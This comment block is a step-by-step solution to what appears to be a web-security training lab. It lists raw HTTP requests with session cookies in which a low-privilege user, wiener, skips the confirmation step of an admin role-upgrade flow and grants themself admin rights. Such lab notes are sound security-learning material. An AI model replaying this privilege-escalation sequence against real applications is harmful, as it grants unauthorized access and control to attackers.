/*
STEPS to change the user role:

1) GET /my-account?id=administrator HTTP/2
   Referer: https://0a0500eb041d89368115c0ee00100048.web-security-academy.net/login
   Cookie: session=UZflYvulW7aw2lL3w2YXZPnaSGhBWhdk

2) POST /admin-roles HTTP/2
   Cookie: session=UZflYvulW7aw2lL3w2YXZPnaSGhBWhdk
   Referer: https://0a0500eb041d89368115c0ee00100048.web-security-academy.net/admin
   username=carlos&action=upgrade

3) POST /admin-roles HTTP/2
   Cookie: session=UZflYvulW7aw2lL3w2YXZPnaSGhBWhdk
   Referer: https://0a0500eb041d89368115c0ee00100048.web-security-academy.net/admin-roles
   action=upgrade&confirmed=true&username=carlos

4) LOGOUT from admin and login as wiener
   GET /my-account?id=wiener HTTP/2
   Cookie: session=Wg8LDavenXU26X0UlWsQYO3yDum8R2L2

5) POST /admin-roles HTTP/2
   Cookie: session=Wg8LDavenXU26X0UlWsQYO3yDum8R2L2
   username=wiener&action=upgrade          //UNAUTHORIZED

6)  POST /admin-roles HTTP/2
    Cookie: session=Wg8LDavenXU26X0UlWsQYO3yDum8R2L2
    action=upgrade&confirmed=true&username=wiener             //302 redirect SOLVED
*/